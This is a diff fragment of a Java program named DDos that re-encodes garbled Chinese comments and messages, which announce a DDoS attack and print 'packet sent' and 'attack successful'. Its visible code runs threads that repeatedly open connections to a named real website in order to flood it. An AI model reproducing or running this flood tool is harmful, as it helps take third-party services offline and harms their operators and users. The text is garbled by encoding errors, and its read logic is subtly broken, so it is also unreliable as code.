@@ -10,7 +10,7 @@ import java.util.concurrent.Executors;
 
 /**
  * @author Administrator
- * Ò»¸öÓÃjdk×Ô´øapiÊµÏÖµÄDDos
+ * ä¸€ä¸ªç”¨jdkè‡ªå¸¦apiå®ç°çš„DDos
  */
 public class DDos {  
     public static void main(String[] args) {  
@@ -30,7 +30,7 @@ class Mythread implements Runnable {
                 URL url = new URL("http://www.yimengsoft.com/");  
                   
                 URLConnection conn = url.openConnection();  
-                System.out.println("·¢°ü³É¹¦£¡");  
+                System.out.println("å‘åŒ…æˆåŠŸï¼");  
                 BufferedInputStream bis = new BufferedInputStream(conn.getInputStream());  
                 byte[] bytes = new byte[1024];  
                 int len = -1;  
@@ -39,7 +39,7 @@ class Mythread implements Runnable {
                 if (bis != null) {  
                     if ((len = bis.read()) != -1) {  
                         sb.append(new String(bytes, 0, len));  
-                        System.out.println("¹¥»÷³É¹¦£¡");  
+                        System.out.println("æ”»å‡»æˆåŠŸï¼");  
                         bis.close();  
                     }  
                 }  
